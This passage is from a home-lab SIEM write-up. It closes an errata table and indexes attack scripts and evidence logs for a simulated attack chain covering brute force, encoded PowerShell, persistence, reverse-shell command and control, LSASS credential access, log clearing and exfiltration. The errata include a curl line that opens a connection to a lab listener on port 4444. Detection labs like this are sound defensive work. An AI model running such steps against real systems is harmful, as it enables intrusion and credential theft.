| Stage 6 | The original command used `-0` (HTTP/1.0 switch) before the output path | Use `-o` to write the file |
| ~~Stages 6 and 9~~ | ~~File names differ~~ | **Resolved** — all three steps use `eicar2.com` |
| Stage 3 | Expected logon type depends on the OpenSSH configuration | Record the logon type seen in the event |
| Stage 8 | Alternative trigger `curl http://192.168.60.135:4444` | Produces the same outbound connection to port `4444` |

---

## Appendix D — Raw Evidence Logs and Attack Scripts

Most event evidence discussed in Section 4 is preserved under
[`threat-emulation/evidence-logs/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/), and
every command run during the chain is committed as a runnable script under
[`threat-emulation/attack-scripts/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/attack-scripts/).
Each log file is plain JSON (one alert per file); its status (verified, condensed
excerpt, rule mismatch) is recorded in the index linked at the end of this appendix.

| Stage | Attack script(s) | Evidence log(s) |
|---|---|---|
| 0 Preparation | `00-preparation_kali.sh` | — |
| 1 Reconnaissance | `01-reconnaissance_kali.sh` | `stage01-pfsense-synburst.json` |
| 2 Brute Force | `02-bruteforce_kali.sh` | `stage02-suricata-ssh-bruteforce.json`, `stage02-windows-4625-failed-logon.json`, `stage02-rule-100408-bruteforce-retest.json` |
| 3 Successful Access | `03-successful-access_kali.sh` | `stage03-windows-4740-account-locked.json`, `stage03-rule-100410-correlation-excerpt.json`, `stage03-rule-92657-successful-logon.json` |
| 4 Execution | `04-execution_windows.ps1` | `stage04-sysmon-encoded-powershell.json` |
| 5 Discovery | `05-discovery_windows.cmd` | `stage05-sysmon-net1-discovery.json`, `stage05-rule-100400-shell-child-arp.json`, `stage05-rule-100407-recon-burst.json` |
| 6 Payload Drop | `06-payload-drop_kali.sh`, `06-payload-drop_windows.cmd` | `stage06-suricata-eicar-download.json`, `stage06-virustotal-malicious-detected.json` |
| 7 Persistence | `07-persistence_windows.cmd` | `stage07-sysmon-registry-runkey.json`, `stage07-sysmon-registry-custom-rule.json` |
| 8 Command and Control | `08-command-control_kali.sh`, `08-command-control_windows.ps1` | `stage08-suricata-reverse-shell.json` |
| 8b Credential Access | `08b-credential-access_windows.cmd` | `stage08b-rule-100411-lsass-excerpt.json`, `stage08b-rule-100411-lsass-false-positive-windowsdefender.json` |
| 9 File Lifecycle | `09-file-lifecycle_windows.ps1` | — (screenshot only, Figure 15) |
| 10 Anti-Forensics | `10-anti-forensics_windows.ps1` | `stage10-windows-1102-log-cleared.json`, `stage10-rule-100412-excerpt.json` |
| 11 HTTP Transfer / Exfiltration Simulation | `11-exfiltration_kali.sh`, `11-exfiltration_windows.ps1` (`Invoke-WebRequest` POST; stock server has no upload handler) | — (not yet evidenced) |

Five further logs sit under `threat-emulation/evidence-logs/` as supplementary
baseline evidence, not tied to a specific chain stage: `baseline-pfsense-udp-allowed.json`, `baseline-pfsense-icmp-mismatch.json`, `baseline-pfsense-synburst-example1.json`, `baseline-pfsense-synburst-e2e.json`, `baseline-suricata-portscan.json`, and `stage08-suricata-reverse-shell-baseline-test.json` (the first reverse-shell
rule test, run before the chain).

Each stage's evidence-log status (verified / condensed / mismatched) is
indexed in [`threat-emulation/evidence-logs/README.md`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/README.md).
